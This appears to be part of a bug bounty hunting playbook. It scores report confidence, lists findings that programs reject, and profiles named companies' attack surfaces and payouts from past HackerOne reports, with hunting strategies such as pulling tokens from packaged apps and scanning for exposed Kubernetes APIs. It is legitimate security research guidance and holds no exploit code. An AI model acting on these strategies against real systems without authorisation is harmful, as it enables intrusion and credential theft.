## Confidence Scoring

Start at **100**, deduct:
- Partial attack path: **-20**
- Bounded, non-compounding impact: **-15**
- Requires specific (but achievable) state: **-10**
- Requires user interaction: **-10**
- Fix already partially mitigates: **-10**

Confidence ≥ 80 → full description + PoC + fix.
Confidence 60–79 → description + partial PoC.
Below 60 → LEAD only (no fix, no PoC).

---

## ALWAYS REJECTED — Never Submit These

Missing CSP/HSTS/security headers, missing SPF/DKIM/DMARC, GraphQL introspection alone, banner/version disclosure without working CVE exploit, clickjacking on non-sensitive pages, tabnabbing, CSV injection, CORS wildcard without credential exfil PoC, logout CSRF, self-XSS, open redirect alone, OAuth client_secret in mobile app, SSRF DNS-ping only, host header injection alone, no rate limit on non-critical forms, session not invalidated on logout, concurrent sessions, internal IP disclosure, mixed content, SSL weak ciphers, missing HttpOnly/Secure cookie flags alone, broken external links, pre-account takeover, autocomplete on password fields.

---

## HIGH-VALUE TARGET PROFILES (From H100 Analysis)

Patterns extracted from 100 highest-upvoted HackerOne reports. Use for target selection and prioritization.

### Tier 1: Highest ROI Targets

**GitLab (12 reports, $134K total bounty)**
- Biggest attack surface of any program — code hosting, CI/CD, wiki, imports
- Top bug classes: RCE (4), File Read/Write (3), SSRF, Data Leak, SSTI
- Key attack surfaces:
  - **Project import** — SSRF, path traversal, file read via UploadsRewriter
  - **Markdown/Wiki rendering** — Kramdown RCE, stored XSS, template injection
  - **File uploads** — path traversal, webshell, ExifTool RCE
  - **CI/CD pipelines** — runner token exposure, pipeline job execution
  - **Merge requests** — code review features bypass file restrictions
- Hunting strategy: Focus on import/export features, check for path traversal in any file copy/move operation

**Shopify (8 reports, $50K total bounty)**
- Top bug classes: Privilege Escalation (4), SSRF, OAuth, Credential Leak, SSTI
- Key attack surfaces:
  - **Email confirmation flow** — bypass leads to full store takeover via SSO
  - **Electron apps** — .env files in packaged apps leak GitHub tokens
  - **Third-party apps** — OAuth misconfigurations in app integrations
  - **Stocky app** — OAuth token theft via redirect_uri manipulation
- Hunting strategy: Download all Shopify apps, extract .env from asar files, check OAuth flows

**PayPal (6 reports, $93.9K total bounty — highest $/report)**
- Top bug classes: XSS (2), RCE, Token Leak, DoS, IDOR
- Key attack surfaces:
  - **Login page** — cache poisoning → stored XSS on paypal.com/signin
  - **Security challenge flow** — token leaks email + plaintext password
  - **npm packages** — internal packages published to public registry
  - **Business management API** — IDOR on user management endpoints
- Hunting strategy: Focus on auth flows, cache poisoning, supply chain

**Snapchat (7 reports, $65K total bounty)**
- Top bug classes: Infrastructure Misconfig (3), RCE, Auth Bypass, SSRF
- Key attack surfaces:
  - **Internal tools** — Jenkins, Grafana, CI dashboards exposed
  - **Kubernetes** — API server exposed to internet, no auth
  - **Content management** — delete any user's spotlight content
  - **GraphQL** — information disclosure via introspection
- Hunting strategy: Scan for exposed admin panels, K8s APIs, internal dashboards

### Tier 2: Consistent Payouts

**Valve (5 reports, $40K)**
- Game client RCE (buffer overflow, XSS in chat), SQLi, payment tampering
- Attack surface: Steam client, game servers, report generation API
- Key: Client-side parsing of untrusted data (server info, chat messages)

**X / xAI (4 reports, $20.16K)**
- Pre-auth RCE via VPN (Pulse Secure 1-day), auth bypass, CRLF injection
- Attack surface: VPN infrastructure, Digits API, web properties
- Key: Monitor VPN vendor patches, test immediately after disclosure

**Uber (3 reports, $40.4K)**
- Info disclosure (bonjour.uber.com RPC), OAuth chain, leaked certificates
- Attack surface: Internal microservices, mobile APIs, OAuth flows
- Key: Check old/mobile API versions, leaked certs in git history

### Tier 3: Quick Wins

**Snapchat infrastructure** — Jenkins, Grafana, K8s API = instant $10-25K
**Starbucks** — SQLi on web apps + leaked credentials in repos = consistent findings
**Razer** — SQLi + command injection on gaming web portals
**Mail.ru** — SQLi, file upload, memory disclosure
**LY Corp (LINE)** — HTTP smuggling, OAuth misconfig, privilege escalation

### Cross-Target Patterns

| Attack Vector | Programs Hit | Avg Bounty |
|---------------|-------------|------------|
| Leaked tokens in code/apps | Shopify, Starbucks, Snapchat, Superhuman | $10-50K |
| HTTP smuggling → session hijack | Slack, LY Corp, Zomato, New Relic | $0-6.5K |
| Infrastructure misconfig (Jenkins/K8s) | Snapchat | $10-25K |
| GraphQL missing auth | HackerOne | $0-12.5K |
| Email confirmation bypass | Shopify | $0-15K |
| Cache poisoning → XSS | PayPal | $18-20K |
| File upload → RCE | Semrush, Starbucks, GitLab | $0-20K |
| npm/supply chain | PayPal, LY Corp | $11-30K |
| SQLi (classic) | Starbucks, Razer, Valve, Mail.ru, GSA | $0-25K |

## Conditionally Valid With Chain

| Low Finding | + Chain | = Valid Bug |
|------------|---------|-------------|
| Open redirect | + OAuth code theft | ATO |
| Clickjacking | + sensitive action + PoC | Account action |
| CORS wildcard | + credentialed exfil | Data theft |
| CSRF | + sensitive state change | Account takeover |
| No rate limit | + OTP brute force | ATO |
| SSRF (DNS only) | + internal access proof | Internal network access |
| Host header injection | + password reset poisoning | ATO |
| Self-XSS | + login CSRF | Stored XSS on victim |

---

## Safe Patterns (Do Not Flag)

**Smart contracts:** `unchecked` in Solidity 0.8+ with correct reasoning, explicit narrowing casts in 0.8+, MINIMUM_LIQUIDITY burn on first deposit, `SafeERC20`, `nonReentrant` (flag only cross-contract), two-step admin transfer, consistent protocol-favoring rounding without compounding.

**Web/API:** Rate limiting that genuinely prevents exploitation, CSRF tokens that are properly validated, self-XSS without escalation path, logout CSRF without session fixation, non-sensitive information disclosure (stack traces in dev mode only).

**Infrastructure/Nodes:** Unauthenticated operator RPC (ecosystem standard), plaintext local signer/CL↔EL communication, default bind to 0.0.0.0 (dev convenience), JWT without `exp` when `iat` freshness enforced, version/health endpoints without auth, no CORS headers on non-browser APIs.

**General:** Operator configuration parameters treated as attacker input, "add rate limiting" without amplification attack, "use checked_X instead of saturating_X" when upstream check exists, error messages containing HTTP status codes or generic library errors (not credentials/PII).

---

## RESOURCES

- [HackerOne Hacktivity](https://hackerone.com/hacktivity) — Disclosed reports
- [HackerOne Top 100 Upvoted](https://reddelexc.github.io/hackerone-reports/#tops_100/TOP100UPVOTED.md) — Highest upvoted reports by bug class and program
- [HackerOne Top 100 Paid](https://reddelexc.github.io/hackerone-reports/#tops_100/TOP100PAID.md) — Highest paying reports
- [PortSwigger Web Academy](https://portswigger.net/web-security) — Free vuln labs
- [HackTricks](https://book.hacktricks.xyz) — Attack technique reference
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings) — Payload reference
- [SecLists](https://github.com/danielmiessler/SecLists) — Comprehensive wordlists
- [Solodit](https://solodit.cyfrin.io) — 50K+ searchable audit findings (Web3)
- [sisakulint](https://sisaku-security.github.io/lint/) — GitHub Actions SAST
- [interactsh](https://app.interactsh.com) — OOB callback server
